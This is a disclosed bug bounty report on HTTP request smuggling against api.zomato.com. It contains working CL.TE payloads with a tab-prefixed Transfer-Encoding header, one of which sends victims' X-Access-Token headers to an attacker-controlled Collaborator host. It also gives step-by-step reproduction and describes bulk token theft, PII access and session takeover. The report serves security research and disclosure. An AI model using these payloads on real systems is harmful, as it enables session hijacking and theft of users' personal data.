# Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com

## Report Details
- **Report ID**: 771666
- **URL**: https://hackerone.com/reports/771666
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-01-10T14:24:17.581Z
- **Disclosed**: 2020-07-09T05:56:04.312Z

## Reporter
- **Username**: defparam
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
# Intro
Hi Zomato Security Team!
My name is Evan Custodio and this is my first time evaluating your platform. I specialize in looking for server-side vulnerabilities. Recently I've taken a deep look at HTTP Request Smuggling issues. I have custom tools to evaluate over 150 types of HTTP Smuggling Payloads. When evaluating your platform I've found one asset that falls victim to HTTP Smuggling Attacks that result in: PII/Information Leakage, Session Takeover, Victim Request Hijacking/Forging and Forced Victim Redirection to Attacker Endpoint. this is a serious bug that should be dealt with immediately as any bad Actor could use these issues to stage attacks that could cause severe damage to Zomato and Zomato's Customers.

# api.zomato.com
## The Request Smuggling Bug
This asset is vulnerable several CL.TE-based HTTP Request Smuggling issues. This issue can cause data to poison the backend server socket and interfere with customer requests. One specific payload that cause issues are named in my tool as: "**tabprefix1**". This payload is a mutation of the "**Transfer-Encoding: chunked**" header that is placed in an HTTP request with "**Content-Length: (length)**" header. In the HTTP spec it is stated that when both Transfer-Encoding: chunked and Content-Length headers are specified then the server should always prioritize chunked encoding over Content-Length sizing. However, in cases when multiple reverse proxies are inline to an HTTP connection and a corner case TE and CL header are both specified, there are times when the frontend server may not recognize the TE header and fallback to CL processing while the backend server recognizes the TE header and prioritizes it over CL. When this happens it is considered HTTP De-synchronization which can lead to Request Smuggling (attacker data poisoning the backend socket into the victim connection).

Definition of **tabprefix1**:
- An HTTP request where both CL and TE headers are specified and where the TE header is formatted like so:
	- ``Transfer-Encoding:\tchunked`` (note that there is a tab after the colon and before the 'chunked', this disrupts the parsing)

This asset specifically shows issues with the **tabprefix1** test (see glimpse below)

{F680682}

If we focus on this specific attack payload,  here is what a typical hijack would look like:
```
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 51
User-Agent: Treasure/6.7

0

GET /some/other/endpoint HTTP/1.1
X-Ignore: X[STOP]
```
If you look closely at the headers both Transfer-Encoding and Content-Length headers are specified in this payload. This hits a natural corner case in which Transfer-Encoding takes priority over the Content-Length, however if you look closely this payload places a tab character after the colon on the Transfer-Encoding line. By doing this the frontend server rejects that line and processes the whole request using the length of 51 found in the Content-Length header and forwards all 51 bytes of data to the backend server. The backend server sees the same HTTP request and processes the `Transfer-Encoding : chunked` as a normal chunked request. The issue is that the chucked request specifies 0 bytes of data and the remaining data of the 51 bytes is left on socket to poison the next customer request that comes into the backend server. Since this payload has no return characters after the "X-Ignore: X" then the poison data essentially pre-pends onto the customer request, their HTTP request line is deleted and the customer is redirected to `/some/other/endpoint`


# Bug #1 - Chain with an Open Redirect to Steal Session Tokens at Bulk
This bug is the big one that I believe is critical. As an attacker with Burp, one can craft a single Request Smuggling payload to steal a customer session token on Zomato. The following payload can be pasted into the repeater to illustrate this:
```
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7

0

GET https://2psvzm9pf3hkuz2dptyimjaynptfh4.burpcollaborator.net/desync/ HTTP/1.1
X: X
```
It appears when you smuggle and hijack an HTTP request and you change the request endpoint to be: `https://some.host.name/desync/` on the request line the backend server should never see a request like this because the frontend server immediately returns `404 Not Found`. However, if you smuggle it past the frontend server to the backend then the request is never filtered and it is responded to with a `301 Moved Permanently` to the location `http://some.host.name/desync`. When we do that to a victim connection the victim's HTTP client automatically redirects to the new location with the same exact headers (including and most importantly the `X-Access-Token:` header). In my test I set up a Burp Collaborator client with an address to force redirection to. The collaborator sees the DNS lookup and the HTTP Request with the  `X-Access-Token:` token. Futhermore I also receive the IP address of the victim.

Here is an example of me sending 1 smuggle/hijack to a victim in Burp Repeater:
█████

Here is the victim request showing up in my collaborator:
█████████

To illustrate impact, an attacker could write a script to scrape Access-Tokens this way, then with the access token grab the UserID via `GET /v2/tabbed/home HTTP/1.1`. Then with the Access-Token/UserID pair the attacker can access: `GET /v2/userdetails.json/<USERID> HTTP/1.1` to get the victim's First/Last Name, Phone Number, Email address, etc..

Also the attacker can perform full session takeover/impersonation by performing a normal login into zomato, intercept the response to his own `POST /v2/auth` request and swap his Access-Token/USERID with the victim's Access-Token/USERID. By doing this the mobile app will log onto zomato as if the attacker were the victim.

# Bug #1 - Triage
1) Open Burp and go into the Repeater tab
2) Click send and enter in the hostname/port/SSL (api.zomato.com 443 checked)
3) Click on menu Burp->Burp Collaborator client
4) In the Collaborator window set to Poll every 1 second and click on "Copy to clipboard", your collaborator URL should be in the clipboard, keep it saved
5) Back in the repeater paste the following as your request body:
```
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7

0

GET https://**YOUR_COLLAB_URL**/desync/ HTTP/1.1
X: X
```
and replace YOUR_COLLAB_URL with the one copied from your collab client

6) Click send as many times required to see HTTP requests in your collab window.
**NOTE**: Sometimes you may just see DNS requests to your collaborator. Send the payload out as many times required to see an HTTP request.

# Conclusion
Thanks for your time reading my report and performing triage. I hope this writeup proves helpful! I have ceased my testing on `api.zomato.com` until remedy is in place. Once your team had remedy in place I will be happy to run my array of desync tests on the asset.

Thanks,
@defparam

## Impact

Attacker can achieve victim session takeover in bulk and steal all information from the victim. This attack can be automated to perform this process in bulk. Since this is the case I have filed this report as **Critical** because I believe it meets the criteria of:

`Information Disclosure - mass PII leaks including data such as names, phone numbers and addresses`

## Attachments
- initial_test.png
